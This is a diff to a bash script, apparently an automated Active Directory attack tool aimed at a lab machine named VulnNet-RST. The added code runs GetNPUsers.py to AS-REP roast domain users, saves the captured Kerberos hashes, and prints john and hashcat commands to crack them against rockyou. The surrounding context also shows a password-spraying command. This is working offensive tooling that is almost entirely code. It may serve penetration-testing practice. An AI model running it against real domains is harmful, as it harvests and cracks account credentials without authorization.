@@ -219,6 +219,46 @@ if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
     echo "# Use for password spraying:"
     echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
     echo ""
+    
+    # AS-REP Roasting with GetNPUsers.py
+    echo -e "\n\033[96m[+] Checking for AS-REP Roastable users (GetNPUsers.py)\033[0m"
+    
+    # Try to get domain name
+    if [ -n "$domain" ]; then
+        domain_name="$domain"
+    else
+        # Try to extract from guest output first
+        domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+        
+        # If not found, try anonymous output
+        if [ -z "$domain_name" ]; then
+            domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+        fi
+        
+        # If still not found, try lookupsid output
+        if [ -z "$domain_name" ]; then
+            domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
+        fi
+    fi
+    
+    if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
+        echo "# Using domain: $domain_name"
+        getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
+        echo "$getnpusers_output"
+        
+        # Check if any AS-REP roastable users were found
+        if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
+            echo -e "\n\033[92m[+] AS-REP Roastable users found! Hashes saved to: nxc-enum/smb/asrep-getnpusers.txt\033[0m"
+            echo "# Crack with:"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-getnpusers.txt"
+            echo "hashcat -m 18200 nxc-enum/smb/asrep-getnpusers.txt /usr/share/wordlists/rockyou.txt"
+        fi
+    else
+        echo "# Could not auto-detect domain name"
+        echo "# Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
+        echo "# Or re-run script with: ./nxc-auto.sh -i $IP -d vulnnet-rst.local"
+    fi
+    echo ""
 fi
 
 
